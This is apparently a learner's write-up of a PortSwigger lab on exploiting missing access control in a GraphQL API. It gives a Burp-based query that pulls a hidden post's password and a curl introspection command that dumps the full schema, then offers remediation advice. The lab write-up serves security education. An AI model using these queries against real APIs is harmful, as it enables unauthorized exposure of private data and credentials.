# Accessing private GraphQL posts

## Lab URL
https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts

## Summary
The blog page for this lab contains a hidden blog post that has a secret password, Due to insufficient access controls on the `GraphQL API` , password can be fetched without proper authoization.

## Steps to Reproduce
1. On the main page, Click on any blog post, then intercept the request using burpsuite.
2. Skip through the requests until you find the `graphql` request, then send it to `Burp Repeater`.
3. Replace the body of the request by the following `GraphQL` query:
	```
	{
 	    "query": "query { getBlogPost(id: 3) {postPassword}}"
	}
	```
4. Click Send, and the response will include the secret password for the private post.

## Explanation
- This vulnerability arise when there is insufficent access control on a `GraphQL API` leads to unauthorized data exposure.
- This lab uses `GraphQL` to fetch blog content from the database.
- When the blog post is clicked, a `GraphQL` request is made in the background.
- By intercepting the `GraphQL` request, we can analyze and manipulate the query.

### Discovering the GraphQL Schema
-to discove the full structure of the `GraphQL`, run the following command in linux.
	<pre lang="markdown"> 
 	curl -X POST https://YOUR-LAB-ID.web-security-academy.net/graphql/v1 \ 
  	-H "Content-Type: application/json" \
   	-d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations 	args { ...InputValue } } } } 		fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } deprecationReason } 	inputFields { ...InputValue 	} interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on 		__InputValue { name 		description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"}' ``` 
 	</pre>
 
### Visualizing the schema
- Go to [GraphQL Voyager](https://graphql-kit.com/graphql-voyager)
- Click `CHANGE SCHEME` -> `INTROSPECTION`.
- Paste the output from the curl command.
- Click `DISPLAY`, Then it will show a visual diagrame of the `GraphQL`.
- By this diagrame we can use graphql syntax to get the data we want.

## Recommendation
- Disable Introspection.
- Avoid returning fields like `password`, `securityKey` and so on.

## Screenshot
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/my_learning_journey/GraphQL/report_one/report_images/image_one.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/my_learning_journey/GraphQL/report_one/report_images/image_two.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/my_learning_journey/GraphQL/report_one/report_images/image_three.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/my_learning_journey/GraphQL/report_one/report_images/image_four.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/my_learning_journey/GraphQL/report_one/report_images/image_five.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/my_learning_journey/GraphQL/report_one/report_images/image_six.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/my_learning_journey/GraphQL/report_one/report_images/image_seven.png)
